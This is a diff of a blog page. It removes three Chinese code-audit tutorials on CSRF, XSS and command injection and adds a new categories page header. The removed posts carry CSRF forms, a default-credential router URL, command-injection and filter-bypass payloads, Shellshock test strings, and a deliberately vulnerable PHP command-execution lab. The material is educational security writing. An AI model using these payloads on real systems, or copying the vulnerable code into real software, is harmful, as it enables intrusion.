@@ -1,2179 +1,966 @@
 <!DOCTYPE html>
-
-
-
-
-
-<html lang="zh-Hans">
+<html>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.5.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.4.0">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.4.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    },
-    sidebarPadding: 40
-  };
-</script>
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="hl0rey&#39;s blog">
-<meta property="og:url" content="http://hl0rey.github.io/page/2/index.html">
+  <meta charset="utf-8">
+  <title>hl0rey&#39;s blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="hl0rey&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://hl0rey.github.io/categories/index.html">
 <meta property="og:site_name" content="hl0rey&#39;s blog">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-01-31T07:43:16.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hl0rey&#39;s blog">
-  <link rel="canonical" href="http://hl0rey.github.io/page/2/">
+<meta name="twitter:title" content="categories">
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: true,
-    isPost: false,
-    isPage: false,
-    isArchive: false
-  };
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
 </script>
 
-  <title>hl0rey's blog</title>
-  
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
 
 
 
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
 
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<script src="/js/iconfont.js?v=1.0.1" ></script>
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">hl0rey's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
 </div>
 
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-  </ul>
-
-    
-
-</nav>
+<body>
+<aside class="nav mobile">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>hl0rey</span>
 </div>
-    </header>
 
+<div class="icon">
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-  <div id="posts" class="posts-expand">
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/25/代码审计之csrf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/25/代码审计之csrf/" class="post-title-link" itemprop="url">代码审计之csrf</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-25 21:20:45" itemprop="dateCreated datePublished" datetime="2018-02-25T21:20:45+08:00">2018-02-25</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="更新于：2018-02-26 14:21:37" itemprop="dateModified" datetime="2018-02-26T14:21:37+08:00">2018-02-26</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="session与cookies"><a href="#session与cookies" class="headerlink" title="session与cookies"></a>session与cookies</h3><p>session的本质是cookies，这二者都是一种身份令牌，用来向服务器证明身份，以实现进行相关操作的时候进行隐式的身份认证．</p>
-<h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><p>核心在于关键的请求是可以伪造，被复用，不具有唯一性．一旦能够伪造正常请求则可能劫持正常用户．</p>
-<h3 id="csrf利用"><a href="#csrf利用" class="headerlink" title="csrf利用"></a>csrf利用</h3><ul>
-<li><p>GET型</p>
-<pre><code>&lt;img src=&quot;http://www.vulner.com/vul.php?buy=1&amp;id=1&quot; /&gt;
-</code></pre><p>  只要在一个页面里加上这段代码就可以了</p>
-</li>
-<li><p>POST型</p>
-<pre><code>&lt;form action=http://wooyun.org/csrf.php method=POST&gt;
-&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;11&quot; /&gt;
-&lt;/form&gt;
-&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
-</code></pre></li>
-<li><p>顺道破解弱口令型</p>
-<pre><code>&lt;img src=http://admin:admin@192.168.1.1 /&gt; 
-获得一个路由器的session
-接下来就可以配合csrf了．
-</code></pre></li>
-</ul>
-
         
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/23/代码审计之XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <a title="rss" href="/atom.xml" target="_blank">
             
-            <a href="/2018/02/23/代码审计之XSS/" class="post-title-link" itemprop="url">代码审计之XSS</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-23 18:45:18" itemprop="dateCreated datePublished" datetime="2018-02-23T18:45:18+08:00">2018-02-23</time>
-            </span>
-          
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
             
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="更新于：2018-02-26 14:23:45" itemprop="dateModified" datetime="2018-02-26T14:23:45+08:00">2018-02-26</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="攻击的类型"><a href="#攻击的类型" class="headerlink" title="攻击的类型"></a>攻击的类型</h3><ul>
-<li><p>反射型XSS</p>
-<pre><code>服务器取得用户输入之后直接再浏览器输出    
-</code></pre></li>
-<li><p>存储型XSS</p>
-<pre><code>服务器取得用户输入之后，存储起来，再输出        
-</code></pre></li>
-<li><p>DOM型XSS</p>
-<pre><code>客户端利用DOM动态的改变页面内容，不经过服务器
-</code></pre></li>
-<li><p>Flash XSS</p>
-</li>
-</ul>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>XSS防御速查表<br><a href="http://www.freebuf.com/articles/web/156622.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/156622.html</a><br>XSS过滤绕过速查表<br><a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/153055.html</a><br>xss利用技巧<br><a href="http://www.freebuf.com/articles/web/157589.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/157589.html</a></p>
-<h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>资料太多了．<br>审计的时候主要是看看可控变量在什么地方输出．<br>值得注意的是经过了实体编码也不能消除威胁的地方．</p>
-<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>htmlspecialchars<br><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.htmlspecialchars.php</a><br>如果不设置该函数的第二个参数的话，那么将不会转义引号，那么如果输出在标签内部，那么也是漏洞．<br>还可以利用宽字符．<br>而且支持的字符集有限，也是个突破口．</p>
-<h3 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h3><ul>
-<li>手工利用<br><a href="http://www.freebuf.com/sectool/159689.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/159689.html</a></li>
-<li>各种利用平台</li>
-</ul>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/19/代码审计之命令执行/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/19/代码审计之命令执行/" class="post-title-link" itemprop="url">代码审计之命令执行</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-19 15:36:11 / 更新于：18:15:33" itemprop="dateCreated datePublished" datetime="2018-02-19T15:36:11+08:00">2018-02-19</time>
-            </span>
-          
-            
-
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <pre><code>有些时候，应用程序需要调用外部程序，这个时候就需要用到操作系统命令执行了．
-</code></pre><h3 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h3><ul>
-<li>system</li>
-<li>exec</li>
-<li>passthru</li>
-<li><p>shell_exec</p>
-</li>
-<li><p>``</p>
-<pre><code>反引号本质是调用shell_exec
-</code></pre><p>  当然，执行命令的办法并不是只能用php内置的函数，比如COM组件．</p>
-</li>
-</ul>
-<h3 id="自动化检测工具"><a href="#自动化检测工具" class="headerlink" title="自动化检测工具"></a>自动化检测工具</h3><pre><code>commix
-</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><pre><code>在网站功能的实现中，可能需要直接调用操作系统命令，一般是为了调用外部程序，这种情况比较少，但还是存在的，为了执行命令而调用系统命令的基本不存在，比如，要调用一个程序来压缩图片，或者识别二维码。
-
-而操作系统的shell特性是允许同时执行多条命令的，依赖特殊的符号来声明有多条命令。Linux下是 | || &amp; &amp;&amp; ;$(shell命令) 还有反引号“ ` ”和$(shell命令)，用它包裹的字符串会被当作系统命令执行，这在php里和linux shell里是一致的。Windows下不支持反引号，别的符号都支持。
-</code></pre><h3 id="漏洞常见类型"><a href="#漏洞常见类型" class="headerlink" title="漏洞常见类型"></a>漏洞常见类型</h3><pre><code>代码层过滤不严
-系统漏洞
-第三方组件(例如 COM)
-</code></pre><h3 id="命令注入的判断方法："><a href="#命令注入的判断方法：" class="headerlink" title="命令注入的判断方法："></a>命令注入的判断方法：</h3><pre><code>分两种情况，有点像sql 注入，一种是有回显的命令执行，一种是没有回显的命令执行。
-有回显的命令执行判断起来十分简单，让命令额外输出一段十分特别的字符串，也就是说，正常不该输出这个字符串，例如afagagnjdghsuiiebgibqkio ，短一点就可以，这里只是举个例子。发送请求后，观察页面有没有出现这个字符串，如果出现了，也就是命令执行成功了。
-对于没有回显的，一可以基于响应时间来判断，比如在linux下 可以执行 sleep 5 ，睡眠任意的秒数，如果相应时间明显变长，如果不是延迟的锅，则可以判断是否存在命令注入。Windows下执行ping -n 127.0.0.1 &gt; 1 (大约五秒钟)，也可以用来判断。二是可以基于服务器的行为，用命令注入让服务器作出一个动作，比如linux可以 wget 一个ip地址或者网站或者是ping一个地址等，ip地址是你可以控制的网站，然后查看访问记录，如果有访问记录就可以认为存在命令注入，windows下用ping。
-</code></pre><h3 id="测试步骤："><a href="#测试步骤：" class="headerlink" title="测试步骤："></a>测试步骤：</h3><h4 id="1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"><a href="#1-安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。" class="headerlink" title="1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。"></a>1.安全等级一的时候，没有过滤任何特殊符号。想怎么注入怎么注入。</h4><p>Payload：<br>1）有回显的<br>| echo test 管道符，把前一个命令的输出作为后一个命令的输入<br>; echo test 分号表示一个命令的结束<br>-1 || echo test 此处逻辑运算符或，只有前面的命令执行失败才能执行后面的命令，所以这地方要故意把或符号前面的参数弄错，导致命令无法正常执行。<br>&amp; echo test<br>&amp;&amp; echo test 这两个与运算必须保证前一个命令能正常执行<br>2）无回显的<br>| sleep 5<br>; sleep 5<br>-1 || sleep 5<br>&amp; sleep 5<br>&amp;&amp; sleep 5<br>用别的判断方法只要把sleep 5 换成其他的命令就行了</p>
-<h4 id="2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"><a href="#2-安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了" class="headerlink" title="2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了"></a>2.安全等级2、3、4、6、7，都是没有过滤完全，只要不用被过滤的字符就可以了</h4><p>例如使用 $(echo 2)</p>
-<h4 id="3-执行黑名单函数"><a href="#3-执行黑名单函数" class="headerlink" title="3.执行黑名单函数"></a>3.执行黑名单函数</h4><p>A）大小写绕过</p>
-<pre><code>Linux？不存在的
-操作系统特性，linux对大小写敏感，windows相反。
-Windows下可以用大小写来绕过比如把echo命令写成成Echo ECho。
-</code></pre><p>B）字符串拼接来执行命令</p>
-<pre><code>例如，执行echo
-a=&quot;ec&quot;;b=&quot;ho&quot;;$a$b 1;
-a=&apos;ec&apos;;b=&apos;ho&apos;;$a$b 1;
-a=&apos;ec&apos;&amp;b=&apos;ho&apos;&amp;$a$b 1;
-a=&apos;ec&apos;&amp;&amp;b=&apos;ho&apos;&amp;&amp;$a$b 1;
-`a=’ec’` `b=’ho’` `$a$b` 用反引号的，这个不常见
-</code></pre><p>C）编码绕过</p>
-<pre><code>编码这块我绕的头疼，先这样吧。
-Linux编码的命令有base64，#（用法：（进制数#数值）），或者用ascii码
-|| base64 echo | base64 -d 
-|| Cg== | base64 -d
-其他的类似只要把符合换换，命令换换
-进制转换来拼接命令非常有限，linux shell只能比较方便的最高支持16进制一下的转化，理论上来说只能执行由123456789abcdef 组成的命令（有待考证）
-Ascii码非常好用，一种是用printf 一种是用tr和od来结合实现，例如，
-字符转化为ascii码  echo &quot;A&quot;| tr -d &quot;\n&quot; | od -An -t dC
-分号可以替换为其他符号，下面这条命令会输出echo
-printf \\x`printf %x 101` ; printf \\x`printf %x 99`; printf \\x`printf %x 104`; printf \\x`printf %x 111` 
-
-Windows cmd比较垃圾，好像没有什么编码
-</code></pre><h4 id="严格过滤之后的绕过"><a href="#严格过滤之后的绕过" class="headerlink" title="严格过滤之后的绕过"></a>严格过滤之后的绕过</h4><pre><code>经过安全等级8的严格过滤，看似已经不可能注入命令了。但是实际上还是有办法注入命令的。这里提到两种办法，一是宽字节注入，二是软件漏洞。
-一是宽字节注入，这个我暂时先停留在设想阶段- -。
-二是软件漏洞，值得一提的漏洞有shellshock和imagemagick解析漏洞
-Shellshock：
-                1).CVE-2014-6271 测试方式:
-                  env x=&apos;() { :;}; echo vulnerable&apos; bash -c &quot;echo this is a test&quot; 
-                   (2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
-                  env -i X=&apos;;() { (a)=&gt;\&apos; bash -c &apos;echo date&apos;; cat echo
-</code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre><code>&lt;?php
-
-global $cmds;
-$cmds = &apos;&apos;;
-$servercmd = &apos;dir&apos;;
-$black = &apos;&apos;;
-
-//字符串替换函数详解
-
-//改变服务器执行的命令
-if (isset($_POST[&apos;servercmd&apos;])) {
-    $servercmd = $_POST[&apos;servercmd&apos;];
-}
-
-if ($_POST[&apos;lv&apos;] == 1) {
-//不做任何过滤
-    $cmds = $_POST[&apos;cmd&apos;];
-
-}
-if ($_POST[&apos;lv&apos;] == 2) {
-    //去掉特殊字符
-    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;,), &apos;&apos;, $_POST[&apos;cmd&apos;]);
-
-}
-if ($_POST[&apos;lv&apos;] == 3) {
-    //去掉特殊字符
-    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
-
-}
-if ($_POST[&apos;lv&apos;] == 4) {
-    //去掉特殊字符
-    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
-
-}
-if ($_POST[&apos;lv&apos;] == 5) {
-    //代码书写错误，造成的绕过，多加了个空格导致过滤函数无效
-    $cmds = str_replace(array(&apos;&amp; &apos;, &apos;| &apos;, &apos;; &apos;, &apos;|| &apos;, &apos;&amp;&amp; &apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
-}
-if ($_POST[&apos;lv&apos;] == 6) {
-    //去掉特殊字符
-    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;, &apos;`&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
-
-}
-if ($_POST[&apos;lv&apos;] == 7) {
-    //去掉特殊字符
-    $cmds = str_replace(array(&apos;&amp;&apos;, &apos;|&apos;, &apos;;&apos;, &apos;||&apos;, &apos;&amp;&amp;&apos;, &apos;`&apos;,&apos;&gt;&apos;), &apos;&apos;, $_POST[&apos;cmd&apos;]);
-
-}
-
-
-if ($_POST[&apos;lv&apos;] == 8) {
-    //过滤了 # &amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \\ \x0A \xFF
-    //在特殊符号之前加了转义符号 \
-    $cmds = escapeshellcmd($_POST[&apos;cmd&apos;]);
-}
-
-//把字符串转换为小写
-if ($_POST[&apos;case&apos;]==1){
-
-    $cmds=strtolower($cmds);//转为小写
-    //strtoupper();转为大写
-    //ucfirst(); 首字母大写
-    //ucwords(); 所有单词首字母大写
-}
-
-//过滤某个命令，基于黑名单
-if (isset($_POST[&apos;black&apos;])) {
-    $black = $_POST[&apos;black&apos;];
-    $cmds = str_replace($black, &apos;&apos;, $cmds);
-}
-
-
-?&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;style&gt;
-    div{
-    text-align: center;
-    }
-    &lt;/style&gt;
-    &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-
-&lt;div id=&quot;center&quot;&gt;
-
-    &lt;form action=&quot;cmd.php&quot; method=&quot;post&quot;&gt;
-    &lt;div id=&quot;title&quot;&gt;命令注入&lt;/div&gt;
-    &lt;br&gt;
-    安全等级：&lt;select name=&quot;lv&quot;&gt;
-        &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
-        &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
-        &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
-        &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;
-        &lt;option value=&quot;5&quot;&gt;5&lt;/option&gt;
-        &lt;option value=&quot;6&quot;&gt;6&lt;/option&gt;
-        &lt;option value=&quot;7&quot;&gt;7&lt;/option&gt;
-        &lt;option value=&quot;8&quot;&gt;8&lt;/option&gt;
-    &lt;/select&gt;&lt;br&gt;&lt;br&gt;
-    &lt;label&gt;函数黑名单：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;black&quot;&gt;&lt;br&gt;&lt;br&gt;
-    &lt;label&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令：&lt;/label&gt;&lt;input type=&quot;text&quot;
-                                                                                         name=&quot;servercmd&quot;
-                                                                                         value=&quot;dir&quot;&gt;&lt;br&gt;&lt;br&gt;
-    &lt;label&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;参数：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot;
-                                                                                         value=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt;
-    &amp;nbsp;&amp;nbsp;
-    &lt;label&gt;是否开启大小写过滤：&lt;/label&gt;&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;case&quot; value=&quot;1&quot;&gt;是&lt;/label&gt;&amp;nbsp;&amp;nbsp;&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;case&quot; value=&quot;2&quot;&gt;否&lt;/label&gt;&lt;br&gt;
-    &lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;
-    &lt;/form&gt;
-&lt;/div&gt;
-&lt;div id=&quot;result&quot;&gt;
-    &lt;?php
-    //给了默认值了，是字符串所以这了进不来，直接构造数据包的时候这地方可以做校验
-    if (!isset($_POST[&apos;lv&apos;]) or !isset($_POST[&apos;cmd&apos;])) {
-    die(&apos; &lt;span id=&quot;tip&quot;&gt;
-安全等级1没有任何过滤&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级2过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级3过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级4过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级5代码书写失误，过滤无效&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级6过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||`&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级7过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||&amp;nbsp;`&amp;nbsp;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级8使用了php的内建函数，在#&amp;nbsp;&amp;&amp;nbsp;;&amp;nbsp;`&amp;nbsp;|&amp;nbsp;*&amp;nbsp;?&amp;nbsp;~&amp;nbsp;&lt;&amp;nbsp;&gt;&amp;nbsp;^&amp;nbsp;(&amp;nbsp;)&amp;nbsp;[&amp;nbsp;]&amp;nbsp;{&amp;nbsp;}&amp;nbsp;$&amp;nbsp;\&amp;nbsp;\x0A&amp;nbsp;\xFF之前加了转移